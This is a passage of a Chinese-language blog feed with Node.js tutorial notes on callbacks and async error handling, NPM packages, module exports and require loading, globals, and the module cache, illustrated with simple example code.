class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//同步代码处理异常</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parseJsonStrToObj</span>(<span class="params">str</span>)</span>&#123;</span><br><span class="line">    <span class="comment">//用于从一个字符串中解析出json对象</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">JSON</span>.parse(str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//对于同步代码，可以使用try...catch来捕获异常</span></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> obj = parseJsonStrToObj(<span class="string">'foo'</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(obj);</span><br><span class="line">&#125;<span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'转换失败了'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出：转换失败了</span></span><br></pre></td></tr></table></figure><ol start="2"><li>异步代码无法使用try…catch处理异常</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//异步代码无法处理异常</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parseJsonStrToObj</span>(<span class="params">str</span>)</span>&#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">JSON</span>.parse(str);</span><br><span class="line">    &#125;,<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> obj = parseJsonStrToObj(<span class="string">'foo'</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(obj);</span><br><span class="line">&#125;<span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'转换失败了'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//最后会报错，说明异步代码无法处理异常</span></span><br></pre></td></tr></table></figure><ol start="3"><li>使用回调函数接收异步代码的执行结果</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//try...catch写在异步代码中</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parseJsonStrToObj</span>(<span class="params">str</span>)</span>&#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">JSON</span>.parse(str);<span class="comment">//有返回值，但是无法接收</span></span><br><span class="line">        &#125;<span class="keyword">catch</span> (e) &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">'转换失败了'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> obj = parseJsonStrToObj(<span class="string">'foo'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(obj);</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出：undefined 转换失败了</span></span><br></pre></td></tr></table></figure><p>根据此提出回调函数的设计，即当使用异步代码去做一件事时，不能预测这件事什么时候做完，其他的事情还在继续，这时可给异步代码准备一个包裹，当异步代码有了执行结果时，可以将结果放在这个包裹里，需要在哪里使用这个结果就从包裹取出。</p><p>回调函数设计的3个约定：</p><p>（1） 函数名通常为callback,在封装异步执行代码时，优先把callback作为函数最后一个参数出现</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> 函数名(<span class="params">arg1,arg2,callback</span>)</span>&#123;&#125;</span><br></pre></td></tr></table></figure><p>（2）把代码中出现的错误作为callback回调函数的第一个参数进行传递,返回结果作为第二个参数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">callback(err,result);</span><br></pre></td></tr></table></figure><p>改写上面函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parseJsonStrToObj</span>(<span class="params">str,callback</span>)</span>&#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="keyword">let</span> obj = <span class="built_in">JSON</span>.parse(str);</span><br><span class="line">            callback(<span class="literal">null</span>,obj);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (e) &#123;</span><br><span class="line">            callback(e,<span class="literal">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line">parseJsonStrToObj(<span class="string">'foo'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">err,result</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(err)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">console</span>.log(<span class="string">'转换失败了'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'转换成功：'</span>+result);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//输出，转换失败了</span></span><br></pre></td></tr></table></figure><h2 id="3-1-3-事件驱动"><a href="#3-1-3-事件驱动" class="headerlink" title="3.1.3 事件驱动"></a>3.1.3 事件驱动</h2><p>当异步函数执行时，不确定何时执行完毕，回调函数会被压入到一个事件循环队列，然后往下执行其他代码，直到异步函数执行完成后，才会开始处理事件循环，调用相应的回调函数。事件循环队列为先进先出队列，按顺序执行。</p><h1 id="3-2-Node-js的包和NPM"><a href="#3-2-Node-js的包和NPM" class="headerlink" title="3.2 Node.js的包和NPM"></a>3.2 Node.js的包和NPM</h1><p>Node.js根据CommonJS规范实现了包机制，CommomJS API定义很多用于非浏览器的应该使用的普通应用程序，Node.js就是一个非浏览器的应用，CommonJS是一种规范，Node.js是这种规范的部分实现。</p><h2 id="3-2-1-包的概念"><a href="#3-2-1-包的概念" class="headerlink" title="3.2.1 包的概念"></a>3.2.1 包的概念</h2><p>包和模块没有本质的区别，包是在模块的基础上更进一步的组织JavaSript代码的目录。</p><p>包目录结构：</p><table><thead><tr><th>规范的包结构</th><th>作用</th></tr></thead><tbody><tr><td>package.json</td><td>顶层目录的包描述文件，说明文件（JSON字符串描述)</td></tr><tr><td>bin</td><td>可执行的二进制文件</td></tr><tr><td>lib</td><td>存放JS文件的目录</td></tr><tr><td>doc</td><td>文档</td></tr><tr><td>test</td><td>存放单元测试用例的代码</td></tr></tbody></table><h2 id="3-2-2-NPM的概念"><a href="#3-2-2-NPM的概念" class="headerlink" title="3.2.2 NPM的概念"></a>3.2.2 NPM的概念</h2><p>全称为Node.js Package Manage,有两种含义，一种是Node.js的开放模块登记和管理系统，是一个NPM网站:<code>www.npmjs.com</code>,里面所有的包都是通过Node.js实现的。</p><p>另一种含义是Node.js的包管理工具，命令行下的软件，比如，npm install 包名</p><p>NPM是随Node.js一同安装的。</p><h2 id="3-2-3-基本应用"><a href="#3-2-3-基本应用" class="headerlink" title="3.2.3 基本应用"></a>3.2.3 基本应用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install 包名</span><br></pre></td></tr></table></figure><p>安装后，Node.js会自动在项目当前根目录下创建一个目录，名为node_modules,然后把第三方包自动放在该目录下。node_modules就是专门用于放置第三方包的。</p><h2 id="3-2-4-包模块加载规则"><a href="#3-2-4-包模块加载规则" class="headerlink" title="3.2.4 包模块加载规则"></a>3.2.4 包模块加载规则</h2><p>（1）加载时，默认为核心模块，若不是，则会去node_modules目录下寻找。</p><p>（2）如果找到了，Node.js将会找到该目录下的package.json文件获取main属性值，根据main属性指定的路径值进行加载。</p>]]></content>
      
      
      <categories>
          
          <category> Node.js </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>初识Node.js</title>
      <link href="2019/05/02/Node.js-%E5%88%9D%E8%AF%86Node.js/"/>
      <url>2019/05/02/Node.js-%E5%88%9D%E8%AF%86Node.js/</url>
      
        <content type="html"><![CDATA[<p>JavaScript在客户端与服务端实现的功能不同，区别具体如下：</p><p>​    在客户端，JavaScript需要依赖浏览器提供的JavaScript引擎解析执行，浏览器提供了对DOM的解析，客户端不仅要应用语法，而且要会操作DOM和BOM。</p><p>​    在服务器端，JavaScript不依赖浏览器，而是由特定的运行环境提供的JavaScript引擎解析执行，例如Node.js，只需应用语法，不需要操作DOM和BOM。</p><a id="more"></a><p>JavaScript包括ECMAScript,DOM,BOM三个部分，具体如下：</p><ol><li>ECMAScript是JavaScript的核心语法</li><li>DOM是HTML和XML的应用程序接口，用于控制文档的内容和结构。</li><li>BOM（浏览器对象模型）可以对浏览器窗口进行访问和操作。</li></ol><h2 id="1-Node-js的特点与优势"><a href="#1-Node-js的特点与优势" class="headerlink" title="1.Node.js的特点与优势"></a>1.Node.js的特点与优势</h2><ul><li>它是一个JavaScript运行环境，前后端语言一致。</li><li>依赖于Chrome v8引擎进行代码解析，这个引擎负责在非浏览器解析情况下解析代码</li><li>事件驱动（Event-Driven）</li><li>非阻塞I/O：服务器端会设计阻塞I/O的操作，Node.js使用事件回调的方式实现非阻塞I/O</li><li>轻量，可伸缩，适于实时数据交互应用</li><li>单进程，单线程：阻塞I/O一个线程只能处理一个任务，非阻塞I/O一个线程永远在处理任务，Node.js采用             单线程，利用事件驱动的异步编程模式，实现了非阻塞I/O。</li></ul><h2 id="2-第一个Node-js的web程序"><a href="#2-第一个Node-js的web程序" class="headerlink" title="2.第一个Node.js的web程序"></a>2.第一个Node.js的web程序</h2><p>命令行运行<code>node demo.js</code>,demo.js如下，打开浏览器输入127.0.0.1:3000,输出hello world</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//加载http模块</span></span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="comment">//创建http服务器</span></span><br><span class="line">http.createServer(<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line"><span class="comment">//响应结束</span></span><br><span class="line">res.end(<span class="string">'hello world'</span>);</span><br><span class="line"><span class="comment">//监听网址127.0.0.1 端口号3000</span></span><br><span class="line">&#125;).listen(<span class="number">3000</span>,<span class="string">'127.0.0.1'</span>);</span><br></pre></td></tr></table></figure><h2 id="3-REPL运行环境（Read-Eval-Print-Loop）"><a href="#3-REPL运行环境（Read-Eval-Print-Loop）" class="headerlink" title="3.REPL运行环境（Read-Eval-Print-Loop）"></a>3.REPL运行环境（Read-Eval-Print-Loop）</h2><p>打开终端，输入node即可进入REPL运行环境，可以解析JS代码，执行变量和函数的相关操作。</p><p>其实<strong>Chrome中的Console控制台就是REPL环境</strong>。</p><h2 id="4-global对象和模块作用域"><a href="#4-global对象和模块作用域" class="headerlink" title="4.global对象和模块作用域"></a>4.global对象和模块作用域</h2><p>在Node.js中，默认声明的变量，函数都是属于当前文件模块，都是私有的，只有在当前模块作用域内可以使用，如果想在全局范围内为某个变量赋值，可以应用 全局对象global.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> foo = <span class="string">'bar'</span>;</span><br><span class="line">global.foo = foo;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'global:foo'</span>+global.foo);</span><br></pre></td></tr></table></figure><h3 id="4-1-require-exports-module-exports"><a href="#4-1-require-exports-module-exports" class="headerlink" title="4.1 require(),exports,module.exports"></a>4.1 require(),exports,module.exports</h3><p>在一个文件模块中直接给某个全局变量赋值，显得很突兀，可能会污染命名空间，造成耦合的问题，为了解决上述问题，exports是模块公开的接口，require()用于从外部获取一个模块的接口。</p><p>info.js:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//向外开放变量name</span></span><br><span class="line">exports.name = <span class="string">'itcast'</span>;</span><br><span class="line"><span class="comment">//向外开放变量age</span></span><br><span class="line"><span class="built_in">module</span>.exports.age = <span class="string">'10'</span>;</span><br><span class="line"><span class="comment">//向外开放函数</span></span><br><span class="line"><span class="built_in">module</span>.exports.sayHello = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'hello'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>demo.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//加载模块</span></span><br><span class="line"><span class="keyword">let</span> myModule = <span class="built_in">require</span>(<span class="string">'./info'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(myModule);</span><br><span class="line"><span class="comment">//输出模块中的变量值</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'name:'</span>+myModule.name);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'age:'</span>+myModule.age);</span><br><span class="line"><span class="comment">//调用模块的方法</span></span><br><span class="line">myModule.sayHello();</span><br></pre></td></tr></table></figure><h3 id="4-2-exports和module-exports的区别"><a href="#4-2-exports和module-exports的区别" class="headerlink" title="4.2 exports和module.exports的区别"></a>4.2 exports和module.exports的区别</h3><p>exports是一个指向module.exports的引用，module.exports初始值为一个空对象{}，所以exports初始值也是{}，虽然exports和module.exports都可以向模块外开放变量和函数，但是使用上，<strong>module.exports可以单独定义，返回数据类型，而exports只能返回一个object对象</strong>。</p><p>例如：</p><p>test.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义一个数组</span></span><br><span class="line"><span class="built_in">module</span>.exports=[<span class="string">'name'</span>,<span class="string">'type'</span>,<span class="string">'age'</span>];</span><br></pre></td></tr></table></figure><p>demo2-5.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//加载模块</span></span><br><span class="line"><span class="keyword">let</span> myModule = <span class="built_in">require</span>(<span class="string">'./test'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(myModule);</span><br><span class="line"><span class="comment">//输出数组长度</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'length:'</span>+myModule.length); </span><br><span class="line"></span><br><span class="line"><span class="comment">//输出 结果</span></span><br><span class="line"><span class="comment">//[ 'name', 'type', 'age' ]</span></span><br><span class="line"><span class="comment">//length:3</span></span><br></pre></td></tr></table></figure><p>修改test.js中的代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">exports=[<span class="string">'name'</span>,<span class="string">'type'</span>,<span class="string">'age'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//最后输出</span></span><br><span class="line"><span class="comment">//&#123;&#125;</span></span><br><span class="line"><span class="comment">//length:undefined</span></span><br></pre></td></tr></table></figure><p>可见使用exports直接定义数据，会切断exports与module.exports的联系，出现了找不到值的情况。</p><h2 id="5-全局可用变量，函数和对象"><a href="#5-全局可用变量，函数和对象" class="headerlink" title="5.全局可用变量，函数和对象"></a>5.全局可用变量，函数和对象</h2><p>即不需要进行模块加载，可以直接使用的，例如require()函数。</p><h3 id="5-1-dirname和-filename变量"><a href="#5-1-dirname和-filename变量" class="headerlink" title="5.1 _dirname和 _filename变量"></a>5.1 _dirname和 _filename变量</h3><ul><li>_dirname表示当前文件所在的目录</li><li>_filename表示当前正在执行的脚本的文件名。（绝对路径）</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">'文件的目录是：'</span>+__dirname);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'文件的绝对路径是：'</span>+__filename);</span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line"><span class="comment">//文件的目录是：C:\Users\Jin\Desktop\前端学习\Node.js\chapter 02</span></span><br><span class="line"><span class="comment">//文件的绝对路径是：C:\Users\Jin\Desktop\前端学习\Node.js\chapter 02\demo2-6.js</span></span><br></pre></td></tr></table></figure><h3 id="5-2-全局函数"><a href="#5-2-全局函数" class="headerlink" title="5.2 全局函数"></a>5.2 全局函数</h3><ul><li>setTimeout(cb,ms)：ms后执行cb</li><li>clearTimeout()</li><li>setInterval(cb,ms)：每ms后执行cb</li><li>clearInterval()</li><li>setImmediate(cb)：延迟调用cb函数，cb将在I/O事件回调之后，setTimeout和setInterval回调之前调用</li><li>clearImmediate()</li></ul><h3 id="5-3-console对象"><a href="#5-3-console对象" class="headerlink" title="5.3 console对象"></a>5.3 console对象</h3><p>console是一个全局对象，除了console.log()函数外还提供了其他函数</p><ul><li>console.info</li><li>console.error</li><li>console.warn</li><li>console.dir：用来对一个对象进行检查，以易于阅读和打印的格式显示</li><li>console.time和console.timeEnd</li><li>console.trace：当前执行代码在堆栈中的调用路径</li><li>console.assert：判断某个表达式或变量是否为真（断言）</li></ul><h2 id="6-重写计算器模块"><a href="#6-重写计算器模块" class="headerlink" title="6 重写计算器模块"></a>6 重写计算器模块</h2><p>以add.js为例，定义加减乘除模块</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span>(<span class="params">x,y</span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">parseInt</span>(x)+<span class="built_in">parseInt</span>(y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>index.js：分别使用require加载4个功能模块，并使用exports向外开放这4个接口</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    add:<span class="built_in">require</span>(<span class="string">'./add'</span>);</span><br><span class="line">    <span class="comment">//sub</span></span><br><span class="line">    <span class="comment">//mul</span></span><br><span class="line">    <span class="comment">//divide</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>testCal.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> cal = <span class="built_in">require</span>(<span class="string">'./index'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(cal.add(<span class="number">1</span>,<span class="number">2</span>));<span class="comment">//3</span></span><br></pre></td></tr></table></figure><h2 id="7-require-的模块加载规则"><a href="#7-require-的模块加载规则" class="headerlink" title="7. require()的模块加载规则"></a>7. require()的模块加载规则</h2><p>主要分为两类：文件模块和核心模块</p><ol><li>文件模块</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">'路径.扩展名'</span>);</span><br><span class="line"><span class="built_in">require</span>(<span class="string">'/example.js'</span>);<span class="comment">//当前目录</span></span><br><span class="line"><span class="built_in">require</span>(<span class="string">'./example.js'</span>);</span><br><span class="line"><span class="built_in">require</span>(<span class="string">'../example.js'</span>);<span class="comment">//上一目录</span></span><br></pre></td></tr></table></figure><ol start="2"><li>核心模块</li></ol><p>核心模块包含了基本的API，保存在node.js源码的lib文件下，例如</p><ul><li>全局对象</li><li>常用工具</li><li>事件机制</li><li>文件系统访问</li><li>HTTP服务器与客户端</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">'模块标识'</span>);</span><br><span class="line"><span class="keyword">const</span> os = <span class="built_in">require</span>(<span class="string">'os'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(os.cpus());</span><br></pre></td></tr></table></figure><h2 id="8-模块的缓存"><a href="#8-模块的缓存" class="headerlink" title="8. 模块的缓存"></a>8. 模块的缓存</h2><p>多次使用同一模块，Node.js只会加载一次，模块被缓存在require.cache中</p><p>foo.js:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">'foo模块被加载了'</span>);</span><br></pre></td></tr></table></figure><p>test.js:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">'./foo'</span>);</span><br><span class="line"><span class="built_in">require</span>(<span class="string">'./foo'</span>);</span><br><span class="line"><span class="built_in">require</span>(<span class="string">'./foo'</span>);</span><br><span class="line"><span class="built_in">require</span>(<span class="string">'./foo'</span>);</span><br><span class="line"><span class="comment">//只输出一次 foo模块被加载了，说明只加载了一次</span></span><br></pre></td></tr></table></figure><p>在foo.js加入</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="built_in">require</span>.cache[<span class="built_in">module</span>.filename];</span><br><span class="line"><span class="comment">//删除缓存后输出4次</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Node.js </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>模块化编程</title>
      <link href="2019/05/01/Node.js-%E6%A8%A1%E5%9D%97%E5%8C%96%E7%BC%96%E7%A8%8B/"/>
      <url>2019/05/01/Node.js-%E6%A8%A1%E5%9D%97%E5%8C%96%E7%BC%96%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>随着 Web 技术的蓬勃发展和依赖的基础设施日益完善，前端领域逐渐从浏览器扩展至服务端（Node.js），桌面端（PC、Android、iOS），乃至于物联网设备（IoT），其中 JavaScript 承载着这些应用程序的核心部分，随着其规模化和复杂度的成倍增长，其软件工程体系也随之建立起来（协同开发、单元测试、需求和缺陷管理等），模块化编程的需求日益迫切。</p><p>JavaScript 对模块化编程的支持尚未形成规范，难以堪此重任；一时间，江湖侠士挺身而出，一路披荆斩棘，从刀耕火种过渡到面向未来的模块化方案；</p><a id="more"></a><h1 id="1-1-初识模块化思想"><a href="#1-1-初识模块化思想" class="headerlink" title="1.1 初识模块化思想"></a>1.1 初识模块化思想</h1><h2 id="1-1-1-模块化的概念"><a href="#1-1-1-模块化的概念" class="headerlink" title="1.1.1 模块化的概念"></a>1.1.1 模块化的概念</h2><p>模块化是一种生产方式，这种方式体现了两个特点</p><p>（1）生产效率高</p><p>（2）维护成本低</p><h2 id="1-1-2-模块化开发"><a href="#1-1-2-模块化开发" class="headerlink" title="1.1.2 模块化开发"></a>1.1.2 模块化开发</h2><p>非模块化开发会遇到哪些问题</p><ol><li>命名冲突</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//全局变量中名称重复</span></span><br><span class="line"><span class="keyword">var</span> foo = <span class="string">'bar'</span>;</span><br><span class="line"><span class="keyword">var</span> foo = <span class="string">'brz'</span>;</span><br><span class="line"><span class="comment">//另外若引用第三方的库，在全局对象中声明了一个属性foo，自己的代码中有同样的名称，后加载的会替换之前的</span></span><br></pre></td></tr></table></figure><ol start="2"><li>文件依赖</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">srcipt</span> <span class="attr">src</span>=<span class="string">'./ccc.js'</span>&gt;</span><span class="tag">&lt;/<span class="name">srcipt</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">srcipt</span> <span class="attr">src</span>=<span class="string">'./a.js'</span>&gt;</span><span class="tag">&lt;/<span class="name">srcipt</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">srcipt</span> <span class="attr">src</span>=<span class="string">'./b.js'</span>&gt;</span><span class="tag">&lt;/<span class="name">srcipt</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">srcipt</span> <span class="attr">src</span>=<span class="string">'./c.js'</span>&gt;</span><span class="tag">&lt;/<span class="name">srcipt</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">srcipt</span> <span class="attr">src</span>=<span class="string">'./d.js'</span>&gt;</span><span class="tag">&lt;/<span class="name">srcipt</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">srcipt</span> <span class="attr">src</span>=<span class="string">'./aaa.js'</span>&gt;</span><span class="tag">&lt;/<span class="name">srcipt</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!---&gt;.aaa,js依赖于./a.js,若调换顺序则会出错，模块化开发并不需要将所有的文件引入&lt;!---&gt;</span></span><br></pre></td></tr></table></figure><h1 id="1-2模块化编程的演变"><a href="#1-2模块化编程的演变" class="headerlink" title="1.2模块化编程的演变"></a>1.2模块化编程的演变</h1><h2 id="1-2-1全局函数"><a href="#1-2-1全局函数" class="headerlink" title="1.2.1全局函数"></a>1.2.1全局函数</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!---&gt;计算器的例子&lt;!---&gt;</span></span><br><span 